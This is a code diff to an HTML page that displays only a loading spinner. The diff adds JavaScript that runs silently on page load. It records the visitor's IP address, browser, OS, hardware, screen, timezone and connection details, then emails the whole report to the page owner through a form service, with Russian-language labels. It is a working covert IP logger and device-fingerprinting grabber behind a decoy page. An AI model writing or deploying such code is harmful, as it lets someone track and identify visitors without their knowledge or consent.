@@ -37,11 +37,89 @@
     <div class="loader"></div>
 
     <script>
-        // Функция для отправки IP на сервер Formsubmit без переадресации
-        function sendIP(ip) {
+        // Функция для сбора всей информации о пользователе
+        function collectAllData(ip) {
+            // Собираем данные о браузере и ОС
+            const browserInfo = {
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                languages: navigator.languages,
+                platform: navigator.platform,
+                cookieEnabled: navigator.cookieEnabled,
+                javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
+                pdfViewerEnabled: navigator.pdfViewerEnabled || false,
+                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                deviceMemory: navigator.deviceMemory || 'unknown',
+                maxTouchPoints: navigator.maxTouchPoints || 'unknown'
+            };
+
+            // Собираем информацию об экране
+            const screenInfo = {
+                width: screen.width,
+                height: screen.height,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth,
+                availWidth: screen.availWidth,
+                availHeight: screen.availHeight
+            };
+
+            // Собираем информацию о местоположении (приблизительное по IP)
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const locale = Intl.DateTimeFormat().resolvedOptions().locale;
+
+            // Собираем информацию о подключении
+            const connectionInfo = {
+                downlink: navigator.connection ? navigator.connection.downlink : 'unknown',
+                effectiveType: navigator.connection ? navigator.connection.effectiveType : 'unknown',
+                rtt: navigator.connection ? navigator.connection.rtt : 'unknown',
+                saveData: navigator.connection ? navigator.connection.saveData : 'unknown'
+            };
+
+            // Формируем полное сообщение
+            const fullMessage = `
+🚀 НОВЫЙ ПОСЕТИТЕЛЬ 🚀
+
+📍 IP АДРЕС: ${ip}
+
+🌍 ГЕОЛОКАЦИЯ:
+• Временная зона: ${timezone}
+• Локаль: ${locale}
+
+💻 СИСТЕМА И БРАУЗЕР:
+• User Agent: ${browserInfo.userAgent}
+• Платформа: ${browserInfo.platform}
+• Язык: ${browserInfo.language}
+• Доступные языки: ${browserInfo.languages}
+• Куки включены: ${browserInfo.cookieEnabled}
+• Java включена: ${browserInfo.javaEnabled}
+• PDF просмотр: ${browserInfo.pdfViewerEnabled}
+• Ядер CPU: ${browserInfo.hardwareConcurrency}
+• Память устройства: ${browserInfo.deviceMemory} GB
+• Тач-поинты: ${browserInfo.maxTouchPoints}
+
+🖥 ЭКРАН:
+• Разрешение: ${screenInfo.width}x${screenInfo.height}
+• Глубина цвета: ${screenInfo.colorDepth} bit
+• Глубина пикселей: ${screenInfo.pixelDepth} bit
+• Доступное разрешение: ${screenInfo.availWidth}x${screenInfo.availHeight}
+
+📡 СОЕДИНЕНИЕ:
+• Скорость: ${connectionInfo.downlink} Mbps
+• Тип соединения: ${connectionInfo.effectiveType}
+• RTT: ${connectionInfo.rtt} ms
+• Экономия трафика: ${connectionInfo.saveData}
+
+⏰ ВРЕМЯ ПОСЕЩЕНИЯ: ${new Date().toLocaleString('ru-RU')}
+            `;
+
+            return fullMessage;
+        }
+
+        // Функция для отправки данных на почту
+        function sendDataToEmail(data) {
             const formData = new FormData();
-            formData.append('IP_Пользователя', ip);
-            formData.append('_subject', 'Новый IP!');
+            formData.append('message', data);
+            formData.append('_subject', '🚨 Полные данные посетителя!');
             formData.append('_captcha', 'false');
             
             // Отправка данных через fetch без перезагрузки страницы
@@ -52,15 +130,28 @@
             });
         }
 
-        // Получаем IP и отправляем
-        fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => {
-                sendIP(data.ip);
-            })
-            .catch(error => {
-                console.error('Ошибка получения IP:', error);
-            });
+        // Основная функция
+        function collectAndSendData() {
+            // Получаем IP
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(ipData => {
+                    // Собираем все данные
+                    const allData = collectAllData(ipData.ip);
+                    
+                    // Отправляем на почту
+                    sendDataToEmail(allData);
+                })
+                .catch(error => {
+                    console.error('Ошибка:', error);
+                    // Если не получилось получить IP, всё равно отправляем остальные данные
+                    const fallbackData = collectAllData('Не удалось получить IP');
+                    sendDataToEmail(fallbackData);
+                });
+        }
+
+        // Запускаем сбор данных при загрузке страницы
+        window.addEventListener('load', collectAndSendData);
     </script>
 </body>
 </html>
